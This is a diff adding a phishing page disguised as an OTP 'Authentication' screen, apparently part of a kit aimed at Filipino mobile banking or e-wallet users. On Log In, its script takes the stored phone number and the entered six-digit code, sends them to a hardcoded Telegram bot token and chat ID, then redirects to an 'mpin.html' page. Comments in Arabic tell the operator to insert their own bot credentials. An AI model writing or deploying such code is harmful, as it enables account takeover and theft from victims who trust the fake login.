@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentication - OTP</title>
+    <style>
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background-color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; color: #1a4a9c; }
+        .header { width: 100%; background-color: #2175f3; color: white; padding: 15px 0; display: flex; align-items: center; justify-content: center; position: relative; font-weight: bold; font-size: 18px; }
+        .back-arrow { position: absolute; right: 20px; font-size: 24px; cursor: pointer; }
+        .container { width: 100%; max-width: 400px; padding: 40px 20px; text-align: center; }
+        h2 { font-size: 22px; margin-bottom: 20px; color: #0b2e63; }
+        .info-text { font-size: 14px; color: #5579b1; line-height: 1.6; margin-bottom: 10px; }
+        .phone-number { font-size: 18px; font-weight: bold; color: #0b2e63; margin-bottom: 30px; }
+        .otp-inputs { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 30px; }
+        .otp-inputs input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 1px solid #d1d9e6; border-radius: 8px; outline: none; }
+        .login-btn { background-color: #ced4da; color: #ffffff; border: none; width: 100%; padding: 15px; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: not-allowed; transition: 0.3s; }
+        .login-btn.enabled { background-color: #2175f3; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="header"> <span id="txt-auth">Authentication</span> <span class="back-arrow" onclick="history.back()">←</span> </div>
+    <div class="container">
+        <h2 id="txt-verify">Verify with Text Message</h2>
+        <p class="info-text" id="txt-info">We sent a 6-digit authentication code to your<br>registered mobile number</p>
+        <div id="dynamicPhone" class="phone-number"></div>
+        <div class="instruction" id="txt-instr">Please enter the authentication code</div>
+        <div class="otp-inputs" id="otp-inputs">
+            <input type="tel" maxlength="1"><input type="tel" maxlength="1"><input type="tel" maxlength="1"><input type="tel" maxlength="1"><input type="tel" maxlength="1"><input type="tel" maxlength="1">
+        </div>
+        <button id="loginBtn" class="login-btn" disabled>Log In</button>
+    </div>
+
+    <script>
+        const telegramToken = "8222074677:AAHv5uEJV3TZp1EdZYYa0-CT-L6PK4O22AM"; // استبدله بالتوكن الخاص بك
+        const telegramChatId = "8129155953";   // استبدله بالآيدي الخاص بك
+
+        const lang = localStorage.getItem('lang') || 'tl';
+        const dict = {
+            tl: { auth: "Pagpapatunay", verify: "I-verify gamit ang Text Message", info: "Nagpadala kami ng 6-digit code sa iyong number", instr: "Mangyaring ilagay ang authentication code", btn: "Mag-Log In" },
+            en: { auth: "Authentication", verify: "Verify with Text Message", info: "We sent a 6-digit authentication code to your registered mobile number", instr: "Please enter the authentication code", btn: "Log In" }
+        };
+        
+        document.getElementById('txt-auth').innerText = dict[lang].auth;
+        document.getElementById('txt-verify').innerText = dict[lang].verify;
+        document.getElementById('txt-info').innerText = dict[lang].info;
+        document.getElementById('txt-instr').innerText = dict[lang].instr;
+        document.getElementById('loginBtn').innerText = dict[lang].btn;
+
+        const userPhone = localStorage.getItem('userPhone') || "";
+        document.getElementById('dynamicPhone').innerText = userPhone + '+';
+
+        const inputs = document.querySelectorAll('#otp-inputs input');
+        const loginBtn = document.getElementById('loginBtn');
+        inputs.forEach((input, index) => {
+            input.oninput = () => {
+                input.value = input.value.replace(/[^0-9]/g, '');
+                if (input.value && index < inputs.length - 1) inputs[index+1].focus();
+                const all = Array.from(inputs).every(i => i.value !== '');
+                loginBtn.disabled = !all; loginBtn.classList.toggle('enabled', all);
+            };
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
+            });
+        });
+
+        loginBtn.onclick = () => {
+            const otpCode = Array.from(inputs).map(i => i.value).join('');
+            const msg = `📩 **كود جديد**\n📱 الرقم: \`${userPhone}\`\n🔢 الكود: \`${otpCode}\``;
+            
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+            .then(() => window.location.href = 'mpin.html')
+            .catch(() => window.location.href = 'mpin.html');
+        };
+    </script>
+</body>
+</html>
